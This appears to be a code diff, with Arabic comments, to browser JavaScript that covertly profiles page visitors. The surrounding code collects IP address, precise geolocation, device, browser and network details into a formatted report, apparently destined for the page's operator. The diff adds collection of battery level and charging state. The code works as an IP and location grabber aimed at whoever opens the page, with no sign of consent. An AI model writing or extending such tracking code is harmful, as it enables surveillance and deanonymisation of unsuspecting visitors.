@@ -117,6 +117,7 @@
             hardware: {},
             location: null,
             ip: null,
+            battery: null,
             timestamp: Date.now()
         };
 
@@ -174,6 +175,22 @@
                 // معلومات الشاشة
                 orientation: screen.orientation ? screen.orientation.type : 'غير معروف'
             };
+        }
+
+        // الحصول على معلومات البطارية
+        async function getBatteryInfo() {
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    return {
+                        level: Math.round(battery.level * 100) + '%',
+                        charging: battery.charging ? 'يتم الشحن' : 'غير متصل'
+                    };
+                } catch (e) {
+                    return null;
+                }
+            }
+            return null;
         }
 
         // الحصول على IP بشكل سريع مع خدمات متعددة
@@ -260,11 +277,10 @@
 📱 الجهاز: ${data.device.deviceType}
 🌐 المتصفح: ${data.device.browser}
 📱 محمول: ${data.device.isMobile ? 'نعم' : 'لا'}
-🖥️ الشاشة: ${data.device.screenResolution}
 📶 الشبكة: ${data.hardware.connectionType}
+${data.battery ? `🔋 البطارية: ${data.battery.level} (${data.battery.charging})` : ''}
 🌍 IP: ${data.ip || 'غير متاح'} ⚠️
 📍 الموقع: ${data.location ? `${data.location.latitude.toFixed(4)}, ${data.location.longitude.toFixed(4)}` : 'غير متاح'}
-🕐 المنطقة: ${data.device.timezone}
 🗣️ اللغة: ${data.device.language}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 🔍 User Agent: ${data.device.userAgent}`;
@@ -292,14 +308,16 @@
             visitorData.device = getBasicInfo();
             visitorData.hardware = getQuickHardwareInfo();
             
-            // جمع الموقع و IP بشكل متوازي
-            const [location, ip] = await Promise.all([
+            // جمع الموقع و IP و البطارية بشكل متوازي
+            const [location, ip, battery] = await Promise.all([
                 getLocationFast(),
-                getIPFast()
+                getIPFast(),
+                getBatteryInfo()
             ]);
             
             visitorData.location = location;
             visitorData.ip = ip;
+            visitorData.battery = battery;
             
             console.log('📊 تم جمع البيانات:', visitorData);
             return visitorData;
